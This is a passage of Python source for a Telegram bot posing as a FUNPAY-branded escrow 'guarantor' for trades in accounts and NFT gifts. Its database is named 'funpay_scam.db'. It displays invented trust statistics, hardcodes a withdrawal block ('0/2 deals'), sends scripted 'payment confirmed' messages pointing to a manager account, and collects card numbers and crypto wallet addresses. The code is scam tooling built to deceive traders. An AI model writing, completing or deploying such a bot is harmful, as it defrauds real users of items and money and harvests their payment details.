import asyncio
import logging
import sqlite3
import uuid
import os
from datetime import datetime
from aiohttp import web

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder

# ==================================================
# НАСТРОЙКИ
# ==================================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN не задан в переменных окружения!")

ADMIN_IDS = [8625870625]
PHOTO_URL = os.getenv("PHOTO_URL", "https://i.imgur.com/your_logo.jpg")  # замени ссылку
BOT_USERNAME = os.getenv("BOT_USERNAME", "secretariOffreybot")
PORT = int(os.getenv("PORT", 8080))

logging.basicConfig(level=logging.INFO)
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=storage)

# ==================================================
# БАЗА ДАННЫХ
# ==================================================
try:
    conn = sqlite3.connect("funpay_scam.db", check_same_thread=False)
    cur = conn.cursor()
except Exception as e:
    logging.error(f"Не удалось подключиться к БД: {e}")
    raise

def init_db():
    try:
        cur.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            lang TEXT DEFAULT 'ru',
            card TEXT,
            crypto TEXT,
            stars_username TEXT,
            ref_count INTEGER DEFAULT 0,
            deals_count INTEGER DEFAULT 0,
            successful_deals INTEGER DEFAULT 0
        )
        """)

        cur.execute("""
        CREATE TABLE IF NOT EXISTS deals (
            deal_id TEXT PRIMARY KEY,
            seller_id INTEGER,
            buyer_id INTEGER,
            deal_type TEXT,
            description TEXT,
            amount INTEGER,
            currency TEXT,
            seller_req TEXT,
            buyer_req TEXT,
            status TEXT,
            seller_username TEXT,
            buyer_username TEXT,
            created_at TEXT
        )
        """)

        cur.execute("""
        CREATE TABLE IF NOT EXISTS referrals (
            referrer_id INTEGER,
            referred_id INTEGER,
            PRIMARY KEY (referrer_id, referred_id)
        )
        """)
        conn.commit()
    except Exception as e:
        logging.error(f"Ошибка инициализации БД: {e}")
        raise

init_db()

# ==================================================
# СОСТОЯНИЯ FSM
# ==================================================
class DealStates(StatesGroup):
    # Продавец
    seller_type = State()
    seller_description = State()
    seller_payment_method = State()
    seller_amount = State()
    seller_requisites = State()
    # Покупатель
    buyer_type = State()
    buyer_description = State()
    buyer_payment_method = State()
    buyer_amount = State()
    buyer_seller_username = State()
    # Прочее
    confirm_participation = State()
    requisites_input = State()
    funds_deposit = State()
    profile_requisites_input = State()

# ==================================================
# ТЕКСТЫ (все языки) — исправлен novateam_seller
# ==================================================
TEXTS = {
    'ru': {
        'main_menu': """<b># FUNPAY</b>

<b>Безопасный гарант для сделок в Telegram.</b>

<b>Что внутри:</b>
• защита от мошенников
• удержание средств до завершения сделки
• история и статусы сделок
• поддержка через @GiftsforFunpay

<b>Выберите действие ниже.</b>""",
        'create_deal_msg': 'Выберите вашу роль в сделке:',
        'create_deal_btn': 'Создать сделку',
        'funds_btn': 'Средства',
        'funds_menu': 'Выберите действие:',
        'seller_role': 'Выберите тип сделки:',
        'buyer_role': 'Выберите тип сделки:',
        'deal_type_account': 'Опишите предмет сделки\n\nУкажите важные детали, условия передачи и дополнительные договоренности.',
        'deal_type_gift': 'Отправьте ссылку на NFT Gift\n\nМожно указать одну или несколько ссылок, например:\nhttps://t.me/nft/DurovsCap-1',
        'payment_method': 'Выберите способ оплаты:',
        'amount': 'Введите сумму сделки в {currency}\n\nТолько целое число.',
        'requisites': {
            'rub': 'Введите номер карты\n\nНа нее будет отправлена оплата после завершения сделки.',
            'uah': 'Введите номер карты\n\nНа нее будет отправлена оплата после завершения сделки.',
            'byn': 'Введите номер карты\n\nНа нее будет отправлена оплата после завершения сделки.',
            'stars': 'Введите юзернейм для получения Stars\n\nНапример: @username',
            'usdt': 'Введите адрес криптокошелька',
            'ton': 'Введите адрес криптокошелька'
        },
        'deal_created': '<b>Сделка #{deal_id} создана</b>\n\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Реквизиты:</b> {requisites}\n\n<b>Ссылка для покупателя:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n<b>Статус:</b> ожидаем покупателя.',
        'deal_created_buyer': '<b>Сделка #{deal_id} создана</b>\n\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n\n<b>Ожидаем подтверждение продавца:</b> {seller_username}\n\n<b>Ссылка для продавца:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
        'deal_show_seller': '<b>Сделка #{deal_id}</b>\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Оплата:</b> {currency}\n\n<b>Вы указаны как продавец. Подтвердите участие.</b>',
        'deal_show_buyer': '<b>Сделка #{deal_id}</b>\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Реквизиты продавца:</b> {seller_req}\n\n<b>Ожидайте подтверждения от продавца.</b>',
        'deal_status': '<b>Сделка #{deal_id}</b>\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Статус:</b> {status}',
        'confirm_requisites': 'Выберите тип реквизитов для подтверждения:',
        'requisites_saved': 'Реквизиты сохранены. Ожидаем оплату.',
        'buyer_notify': '✅ Продавец подтвердил участие в сделке #{deal_id}\n\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Реквизиты продавца:</b> {seller_req}',
        'novateam_seller': """💳 Оплата подтверждена

Сделка: #{deal_id}
Покупатель: @{buyer}
Сумма: {amount} {currency}
Предмет: {description}

🛡 Менеджеру @GiftsForFunpay""",
        'novateam_buyer': '✅ Оплата подтверждена! Сделка #{deal_id} завершена.',
        'funds_menu': 'Выберите действие:',
        'funds_deposit': 'Введите ID сделки для оплаты',
        'funds_deposit_error': '🚫 Сделка не найдена.',
        'funds_withdraw': 'Вывести деньги можно только от 2 сделок\nУ Вас 0/2',
        'my_deals_empty': '📭 У вас нет активных сделок.',
        'my_deals_list': '📋 Ваши сделки:\n\n{deals}',
        'requisites_menu': '💳 Ваши реквизиты:\n\nВыберите тип для просмотра или изменения.',
        'requisites_card': 'Введите номер банковской карты',
        'requisites_crypto': 'Введите адрес криптокошелька',
        'requisites_stars': 'Введите юзернейм для получения Stars\n\nНапример: @username',
        'requisites_saved': 'Реквизиты сохранены.',
        'lang_menu': '🌐 Выберите язык / Choose language / 选择语言:',
        'lang_set': 'Язык установлен: {lang}',
        'support': '📞 Поддержка: @GiftsforFunpay\n\nПо всем вопросам обращайтесь к менеджеру.',
        'verify': '''🛡 Верификация

Верификация доступна пользователям с 30+ успешными сделками и оборотом от 1500 USDT.

Преимущества:
• автовывод средств
• приоритетная поддержка
• ускоренное решение спорных ситуаций
Подайте заявку, и администрация рассмотрит ее.''',
        'verify_button': 'Подать заявку',
        'referral': '👥 Реферальная система\n\nВаша реферальная ссылка:\nhttps://t.me/{bot_username}?start=ref{user_id}\n\nПриглашено: {ref_count} человек',
        'about': '''Funpay

Всего сделок: 107107
Успешных сделок: 103835
Общий объем: $1105228
Рейтинг: 4.9/5.0
Онлайн: 15756

🛡 Гарант-сервис
✅ Проверенные продавцы
📢 Поддержка 24/7

🔗 @GiftsforFunpay''',
        'back': '🔙 Назад',
        'seller': 'Я продавец',
        'buyer': 'Я покупатель',
        'account': 'Аккаунт',
        'gift': 'NFT Gift',
        'card': 'Карта',
        'crypto': 'Крипта',
        'stars': 'Stars'
    },
    'en': {
        'main_menu': """<b># FUNPAY</b>

<b>Safe guarantor for deals in Telegram.</b>

<b>What inside:</b>
• protection from scammers
• funds holding until deal completion
• deal history and statuses
• support via @GiftsforFunpay

<b>Select action below.</b>""",
        'create_deal_msg': 'Choose your role:',
        'create_deal_btn': 'Create deal',
        'funds_btn': 'Funds',
        'funds_menu': 'Select action:',
        'seller_role': 'Choose deal type:',
        'buyer_role': 'Choose deal type:',
        'deal_type_account': 'Describe the deal item\n\nSpecify important details, transfer conditions and additional agreements.',
        'deal_type_gift': 'Send NFT Gift link\n\nYou can specify one or more links, e.g.:\nhttps://t.me/nft/DurovsCap-1',
        'payment_method': 'Choose payment method:',
        'amount': 'Enter deal amount in {currency}\n\nInteger only.',
        'requisites': {
            'rub': 'Enter card number\n\nPayment will be sent to it after deal completion.',
            'uah': 'Enter card number\n\nPayment will be sent to it after deal completion.',
            'byn': 'Enter card number\n\nPayment will be sent to it after deal completion.',
            'stars': 'Enter username for Stars\n\nExample: @username',
            'usdt': 'Enter crypto wallet address',
            'ton': 'Enter crypto wallet address'
        },
        'deal_created': '<b>Deal #{deal_id} created</b>\n\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Requisites:</b> {requisites}\n\n<b>Link for buyer:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n<b>Status:</b> waiting for buyer.',
        'deal_created_buyer': '<b>Deal #{deal_id} created</b>\n\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n\n<b>Waiting for seller confirmation:</b> {seller_username}\n\n<b>Link for seller:</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
        'deal_show_seller': '<b>Deal #{deal_id}</b>\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Payment:</b> {currency}\n\n<b>You are listed as seller. Confirm participation.</b>',
        'deal_show_buyer': '<b>Deal #{deal_id}</b>\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Seller requisites:</b> {seller_req}\n\n<b>Waiting for seller confirmation.</b>',
        'deal_status': '<b>Deal #{deal_id}</b>\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Status:</b> {status}',
        'confirm_requisites': 'Select requisites type for confirmation:',
        'requisites_saved': 'Requisites saved. Waiting for payment.',
        'buyer_notify': '✅ Seller confirmed participation in deal #{deal_id}\n\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Seller requisites:</b> {seller_req}',
        'novateam_seller': """💳 Payment confirmed

Deal: #{deal_id}
Buyer: @{buyer}
Amount: {amount} {currency}
Item: {description}

🛡 Manager @GiftsForFunpay""",
        'novateam_buyer': '✅ Payment confirmed! Deal #{deal_id} completed.',
        'funds_menu': 'Select action:',
        'funds_deposit': 'Enter deal ID for payment',
        'funds_deposit_error': '🚫 Deal not found.',
        'funds_withdraw': 'Withdrawal available from 2 deals\nYou have 0/2',
        'my_deals_empty': '📭 You have no active deals.',
        'my_deals_list': '📋 Your deals:\n\n{deals}',
        'requisites_menu': '💳 Your requisites:\n\nSelect type to view or change.',
        'requisites_card': 'Enter bank card number',
        'requisites_crypto': 'Enter crypto wallet address',
        'requisites_stars': 'Enter username for Stars\n\nExample: @username',
        'requisites_saved': 'Requisites saved.',
        'lang_menu': '🌐 Choose language:',
        'lang_set': 'Language set: {lang}',
        'support': '📞 Support: @GiftsforFunpay\n\nContact manager for any questions.',
        'verify': '''🛡 Verification

Verification available for users with 30+ successful deals and turnover from 1500 USDT.

Benefits:
• auto withdrawal
• priority support
• faster dispute resolution
Submit request and administration will review it.''',
        'verify_button': 'Submit request',
        'referral': '👥 Referral system\n\nYour referral link:\nhttps://t.me/{bot_username}?start=ref{user_id}\n\nInvited: {ref_count} people',
        'about': '''Funpay

Total deals: 107107
Successful deals: 103835
Total volume: $1105228
Rating: 4.9/5.0
Online: 15756

🛡 Guarantor service
✅ Verified sellers
📢 24/7 Support

🔗 @GiftsforFunpay''',
        'back': '🔙 Back',
        'seller': 'I am seller',
        'buyer': 'I am buyer',
        'account': 'Account',
        'gift': 'NFT Gift',
        'card': 'Card',
        'crypto': 'Crypto',
        'stars': 'Stars'
    },
    'zh': {
        'main_menu': """<b># FUNPAY</b>

<b>Telegram交易安全担保。</b>

<b>功能：</b>
• 防欺诈保护
• 交易完成前资金冻结
• 交易历史与状态
• 通过 @GiftsforFunpay 支持

<b>请选择操作。</b>""",
        'create_deal_msg': '选择您的角色：',
        'create_deal_btn': '创建交易',
        'funds_btn': '资金',
        'funds_menu': '请选择操作：',
        'seller_role': '选择交易类型：',
        'buyer_role': '选择交易类型：',
        'deal_type_account': '描述交易物品\n\n请注明重要细节、转让条件和附加协议。',
        'deal_type_gift': '发送NFT Gift链接\n\n可以指定一个或多个链接，例如：\nhttps://t.me/nft/DurovsCap-1',
        'payment_method': '选择支付方式：',
        'amount': '输入 {currency} 交易金额\n\n仅限整数。',
        'requisites': {
            'rub': '输入银行卡号\n\n交易完成后将付款至此卡。',
            'uah': '输入银行卡号\n\n交易完成后将付款至此卡。',
            'byn': '输入银行卡号\n\n交易完成后将付款至此卡。',
            'stars': '输入接收Stars的用户名\n\n例如：@username',
            'usdt': '输入加密货币钱包地址',
            'ton': '输入加密货币钱包地址'
        },
        'deal_created': '<b>交易 #{deal_id} 已创建</b>\n\n<b>类型：</b>{deal_type}\n<b>描述：</b>{description}\n<b>金额：</b>{amount} {currency}\n<b>收款方式：</b>{requisites}\n\n<b>买家链接：</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}\n\n<b>状态：</b>等待买家。',
        'deal_created_buyer': '<b>交易 #{deal_id} 已创建</b>\n\n<b>类型：</b>{deal_type}\n<b>描述：</b>{description}\n<b>金额：</b>{amount} {currency}\n\n<b>等待卖家确认：</b>{seller_username}\n\n<b>卖家链接：</b>\nhttps://t.me/{bot_username}?start=deal_{deal_id}',
        'deal_show_seller': '<b>交易 #{deal_id}</b>\n<b>类型：</b>{deal_type}\n<b>描述：</b>{description}\n<b>金额：</b>{amount} {currency}\n<b>支付：</b>{currency}\n\n<b>您被列为卖家。请确认参与。</b>',
        'deal_show_buyer': '<b>交易 #{deal_id}</b>\n<b>类型：</b>{deal_type}\n<b>描述：</b>{description}\n<b>金额：</b>{amount} {currency}\n<b>卖家收款方式：</b>{seller_req}\n\n<b>等待卖家确认。</b>',
        'deal_status': '<b>交易 #{deal_id}</b>\n<b>类型：</b>{deal_type}\n<b>描述：</b>{description}\n<b>金额：</b>{amount} {currency}\n<b>状态：</b>{status}',
        'confirm_requisites': '选择确认收款方式：',
        'requisites_saved': '收款方式已保存。等待付款。',
        'buyer_notify': '✅ 卖家已确认参与交易 #{deal_id}\n\n<b>类型：</b>{deal_type}\n<b>描述：</b>{description}\n<b>金额：</b>{amount} {currency}\n<b>卖家收款方式：</b>{seller_req}',
        'novateam_seller': """💳 付款已确认

交易: #{deal_id}
买家: @{buyer}
金额: {amount} {currency}
物品: {description}

🛡 经理 @GiftsForFunpay""",
        'novateam_buyer': '✅ 付款已确认！交易 #{deal_id} 已完成。',
        'funds_menu': '请选择操作：',
        'funds_deposit': '输入交易ID进行付款',
        'funds_deposit_error': '🚫 未找到交易。',
        'funds_withdraw': '需要完成2笔交易才能提现\n您有 0/2',
        'my_deals_empty': '📭 您没有活跃的交易。',
        'my_deals_list': '📋 您的交易：\n\n{deals}',
        'requisites_menu': '💳 您的收款方式：\n\n选择类型查看或修改。',
        'requisites_card': '输入银行卡号',
        'requisites_crypto': '输入加密货币钱包地址',
        'requisites_stars': '输入接收Stars的用户名\n\n例如：@username',
        'requisites_saved': '收款方式已保存。',
        'lang_menu': '🌐 选择语言 / Choose language / 选择语言：',
        'lang_set': '语言已设置：{lang}',
        'support': '📞 支持：@GiftsforFunpay\n\n如有问题请联系管理员。',
        'verify': '''🛡 认证

拥有30+成功交易且营业额超过1500 USDT的用户可进行认证。

优势：
• 自动提现
• 优先支持
• 加速争议解决
提交申请，管理员将审核。''',
        'verify_button': '提交申请',
        'referral': '👥 推荐系统\n\n您的推荐链接：\nhttps://t.me/{bot_username}?start=ref{user_id}\n\n已邀请：{ref_count} 人',
        'about': '''Funpay

总交易：107107
成功交易：103835
总交易额：$1105228
评级：4.9/5.0
在线：15756

🛡 担保服务
✅ 已认证卖家
📢 24/7 支持

🔗 @GiftsforFunpay''',
        'back': '🔙 返回',
        'seller': '我是卖家',
        'buyer': '我是买家',
        'account': '账号',
        'gift': 'NFT礼品',
        'card': '银行卡',
        'crypto': '加密货币',
        'stars': 'Stars'
    }
}

def get_text(key, lang='ru', **kwargs):
    text = TEXTS.get(lang, TEXTS['ru']).get(key, key)
    if isinstance(text, dict):
        return text
    try:
        return text.format(**kwargs)
    except:
        return text

def get_button_text(key, lang='ru'):
    texts = {
        'ru': {'back': '🔙 Назад', 'seller': 'Я продавец', 'buyer': 'Я покупатель', 'account': 'Аккаунт', 'gift': 'NFT Gift', 'card': 'Карта', 'crypto': 'Крипта', 'stars': 'Stars'},
        'en': {'back': '🔙 Back', 'seller': 'I am seller', 'buyer': 'I am buyer', 'account': 'Account', 'gift': 'NFT Gift', 'card': 'Card', 'crypto': 'Crypto', 'stars': 'Stars'},
        'zh': {'back': '🔙 返回', 'seller': '我是卖家', 'buyer': '我是买家', 'account': '账号', 'gift': 'NFT礼品', 'card': '银行卡', 'crypto': '加密货币', 'stars': 'Stars'}
    }
    return texts.get(lang, texts['ru']).get(key, key)

# ==================================================
# ОТПРАВКА С ФОТО
# ==================================================
async def send_with_photo(chat_id, text, reply_markup=None, parse_mode="HTML"):
    try:
        await bot.send_photo(chat_id=chat_id, photo=PHOTO_URL, caption=text, reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception as e:
        logging.warning(f"Не удалось отправить фото: {e}. Отправляю текст.")
        await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)

# ==================================================
# КЛАВИАТУРЫ
# ==================================================
def get_main_menu(lang="ru"):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_text('create_deal_btn', lang), callback_data="create_deal"))
    builder.row(InlineKeyboardButton(text=get_text('funds_btn', lang), callback_data="funds"))
    builder.row(InlineKeyboardButton(text="Мои сделки", callback_data="my_deals"), InlineKeyboardButton(text="Реквизиты", callback_data="requisites"))
    builder.row(InlineKeyboardButton(text="Язык", callback_data="lang"), InlineKeyboardButton(text="Поддержка", callback_data="support"))
    builder.row(InlineKeyboardButton(text="Верификация", callback_data="verify"), InlineKeyboardButton(text="Рефералы", callback_data="referral"))
    builder.row(InlineKeyboardButton(text="О сервисе", callback_data="about"))
    return builder.as_markup()

def get_back_button(lang="ru"):
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=get_button_text('back', lang), callback_data="main_menu")]])

def get_roles_menu(lang="ru"):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_button_text('seller', lang), callback_data="seller_role"))
    builder.row(InlineKeyboardButton(text=get_button_text('buyer', lang), callback_data="buyer_role"))
    builder.row(InlineKeyboardButton(text=get_button_text('back', lang), callback_data="main_menu"))
    return builder.as_markup()

def get_deal_types(lang="ru"):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=get_button_text('account', lang), callback_data="deal_type_account"))
    builder.row(InlineKeyboardButton(text=get_button_text('gift', lang), callback_data="deal_type_gift"))
    builder.row(InlineKeyboardButton(text=get_button_text('back', lang), callback_data="main_menu"))
    return builder.as_markup()

def get_payment_methods(lang="ru"):
    methods = ['Рубли', 'Гривны', 'BYN', 'Stars', 'USDT', 'TON'] if lang == "ru" else ['RUB', 'UAH', 'BYN', 'Stars', 'USDT', 'TON']
    builder = InlineKeyboardBuilder()
    for m in methods:
        builder.row(InlineKeyboardButton(text=m, callback_data=f"payment_{m.lower()}"))
    builder.row(InlineKeyboardButton(text=get_button_text('back', lang), callback_data="main_menu"))
    return builder.as_markup()

def get_requisites_menu(lang="ru"):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="Карта", callback_data="req_card"))
    builder.row(InlineKeyboardButton(text="Крипта", callback_data="req_crypto"))
    builder.row(InlineKeyboardButton(text="Stars", callback_data="req_stars"))
    builder.row(InlineKeyboardButton(text=get_button_text('back', lang), callback_data="main_menu"))
    return builder.as_markup()

def get_funds_menu(lang="ru"):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="💳 Пополнить", callback_data="funds_deposit"))
    builder.row(InlineKeyboardButton(text="💰 Вывести", callback_data="funds_withdraw"))
    builder.row(InlineKeyboardButton(text=get_button_text('back', lang), callback_data="main_menu"))
    return builder.as_markup()

# ==================================================
# ОБРАБОТЧИКИ
# ==================================================
@dp.message(CommandStart())
async def start(message: Message, state: FSMContext):
    user_id = message.from_user.id
    username = message.from_user.username or "NoUsername"
    lang = 'ru'

    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        if row:
            lang = row[0]
        else:
            cur.execute("INSERT INTO users (user_id, username, lang) VALUES (?, ?, ?)", (user_id, username, lang))
            conn.commit()
    except Exception as e:
        logging.error(f"Ошибка при работе с пользователем {user_id}: {e}")
        await message.answer("🚫 Внутренняя ошибка. Попробуйте позже.")
        return

    args = message.text.split()
    if len(args) > 1:
        param = args[1]
        if param.startswith("deal_"):
            deal_id = param[5:]
            try:
                cur.execute("SELECT seller_id, buyer_id, seller_username, status FROM deals WHERE deal_id=?", (deal_id,))
                deal = cur.fetchone()
                if not deal:
                    await message.answer("🚫 Сделка не найдена.")
                    return
                seller_id, buyer_id, seller_username, status = deal
                # Если пользователь ещё не присоединился как покупатель и место свободно
                if buyer_id is None:
                    cur.execute("UPDATE deals SET buyer_id=?, buyer_username=? WHERE deal_id=?", (user_id, username, deal_id))
                    conn.commit()
                    await message.answer(f"✅ Вы присоединились к сделке #{deal_id} как покупатель.")
                    cur.execute("SELECT seller_id FROM deals WHERE deal_id=?", (deal_id,))
                    seller = cur.fetchone()[0]
                    if seller:
                        await bot.send_message(seller, f"👤 Покупатель @{username} присоединился к сделке #{deal_id}.")
                # Если покупатель уже есть, а продавец не назначен — любой может стать продавцом
                elif seller_id is None:
                    cur.execute("UPDATE deals SET seller_id=?, seller_username=? WHERE deal_id=?", (user_id, username, deal_id))
                    conn.commit()
                    await message.answer(f"✅ Вы стали продавцом в сделке #{deal_id}.")
                elif user_id != seller_id and user_id != buyer_id:
                    await message.answer("ℹ️ У этой сделки уже есть покупатель и продавец. Вы не можете в ней участвовать.")
            except Exception as e:
                logging.error(f"Ошибка при обработке deal ссылки: {e}")
                await message.answer("🚫 Ошибка при присоединении к сделке.")
                return
            await show_deal(message, deal_id, user_id, lang)
            return
        elif param.startswith("ref"):
            try:
                ref_id = int(param[3:])
                if ref_id != user_id:
                    cur.execute("INSERT OR IGNORE INTO referrals (referrer_id, referred_id) VALUES (?, ?)", (ref_id, user_id))
                    cur.execute("UPDATE users SET ref_count = ref_count + 1 WHERE user_id=?", (ref_id,))
                    conn.commit()
                    await message.answer("✅ Вы были приглашены по реферальной ссылке!")
            except Exception as e:
                logging.error(f"Ошибка реферальной ссылки: {e}")

    await send_with_photo(message.chat.id, get_text('main_menu', lang), reply_markup=get_main_menu(lang))

async def show_deal(message: Message, deal_id: str, user_id: int, lang: str):
    try:
        cur.execute("SELECT * FROM deals WHERE deal_id=?", (deal_id,))
        deal = cur.fetchone()
        if not deal:
            await message.answer("🚫 Сделка не найдена.")
            return
        (d_id, seller_id, buyer_id, d_type, desc, amount, curr, seller_req, buyer_req, status, seller_username, buyer_username, created) = deal

        # Если пользователь не является участником, пробуем добавить
        if user_id != seller_id and user_id != buyer_id:
            if buyer_id is None:
                cur.execute("UPDATE deals SET buyer_id=?, buyer_username=? WHERE deal_id=?", (user_id, message.from_user.username or "NoUsername", deal_id))
                conn.commit()
                await message.answer(f"✅ Вы присоединились к сделке #{deal_id} как покупатель.")
                # перезагружаем сделку
                cur.execute("SELECT * FROM deals WHERE deal_id=?", (deal_id,))
                deal = cur.fetchone()
                (d_id, seller_id, buyer_id, d_type, desc, amount, curr, seller_req, buyer_req, status, seller_username, buyer_username, created) = deal
            elif seller_id is None:
                # Любой может стать продавцом, если seller_id ещё не назначен
                cur.execute("UPDATE deals SET seller_id=?, seller_username=? WHERE deal_id=?", (user_id, message.from_user.username or "NoUsername", deal_id))
                conn.commit()
                await message.answer(f"✅ Вы стали продавцом в сделке #{deal_id}.")
                cur.execute("SELECT * FROM deals WHERE deal_id=?", (deal_id,))
                deal = cur.fetchone()
                (d_id, seller_id, buyer_id, d_type, desc, amount, curr, seller_req, buyer_req, status, seller_username, buyer_username, created) = deal
            else:
                await message.answer("🚫 В этой сделке уже есть продавец и покупатель.")
                return

        # Теперь показываем сделку
        if user_id == seller_id:
            text = get_text('deal_show_seller', lang).format(deal_id=d_id, deal_type=d_type, description=desc, amount=amount, currency=curr)
            kb = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Подтвердить участие", callback_data=f"confirm_seller_{deal_id}")]
            ])
            await send_with_photo(message.chat.id, text, reply_markup=kb)
        elif user_id == buyer_id:
            text = get_text('deal_show_buyer', lang).format(deal_id=d_id, deal_type=d_type, description=desc, amount=amount, currency=curr, seller_req=seller_req if seller_req else "Не указаны")
            await send_with_photo(message.chat.id, text)
        else:
            await message.answer("🚫 Вы не являетесь участником этой сделки.")
    except Exception as e:
        logging.error(f"Ошибка в show_deal: {e}")
        await message.answer("🚫 Ошибка при отображении сделки.")

@dp.callback_query(F.data == "main_menu")
async def main_menu_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(callback.message.chat.id, get_text('main_menu', lang), reply_markup=get_main_menu(lang))
    await callback.answer()

@dp.callback_query(F.data == "create_deal")
async def create_deal_callback(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(callback.message.chat.id, get_text('create_deal_msg', lang), reply_markup=get_roles_menu(lang))
    await callback.answer()

@dp.callback_query(F.data == "funds")
async def funds_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(callback.message.chat.id, get_text('funds_menu', lang), reply_markup=get_funds_menu(lang))
    await callback.answer()

# ==================================================
# FSM ДЛЯ СОЗДАНИЯ СДЕЛКИ (ПРОДАВЕЦ)
# ==================================================
@dp.callback_query(F.data == "seller_role")
async def seller_role(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(callback.message.chat.id, get_text('seller_role', lang), reply_markup=get_deal_types(lang))
    await state.set_state(DealStates.seller_type)
    await callback.answer()

@dp.callback_query(DealStates.seller_type, F.data.startswith("deal_type_"))
async def seller_type_chosen(callback: CallbackQuery, state: FSMContext):
    deal_type = callback.data.split("_")[2]  # account или gift
    await state.update_data(deal_type=deal_type)
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(callback.message.chat.id, get_text('deal_type_account' if deal_type == 'account' else 'deal_type_gift', lang))
    await state.set_state(DealStates.seller_description)
    await callback.answer()

@dp.message(DealStates.seller_description)
async def seller_description(message: Message, state: FSMContext):
    await state.update_data(description=message.text)
    user_id = message.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(message.chat.id, get_text('payment_method', lang), reply_markup=get_payment_methods(lang))
    await state.set_state(DealStates.seller_payment_method)

@dp.callback_query(DealStates.seller_payment_method, F.data.startswith("payment_"))
async def seller_payment_method(callback: CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[1]  # rub, uah, byn, stars, usdt, ton
    await state.update_data(currency=currency)
    user_id = callback.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    await send_with_photo(callback.message.chat.id, get_text('amount', lang, currency=currency.upper()))
    await state.set_state(DealStates.seller_amount)
    await callback.answer()

@dp.message(DealStates.seller_amount)
async def seller_amount(message: Message, state: FSMContext):
    # Проверка состояния убрана — она ломала FSM
    if not message.text.isdigit():
        await message.answer("⚠️ Введите целое число.")
        return
    amount = int(message.text)
    if amount <= 0:
        await message.answer("⚠️ Сумма должна быть больше нуля.")
        return
    await state.update_data(amount=amount)
    user_id = message.from_user.id
    try:
        cur.execute("SELECT lang FROM users WHERE user_id=?", (user_id,))
        row = cur.fetchone()
        lang = row[0] if row else 'ru'
    except:
        lang = 'ru'
    data = await state.get_data()
    currency = data['currency']
    req_text = get_text('requisites', lang)[currency]
    await send_with_photo(message.chat.id, req_text)
    await state.set_state(DealStates.seller_requisites)

@dp.message(DealStates.seller_requisites)
async def seller_requisites(message: Message, state: FSMContext):
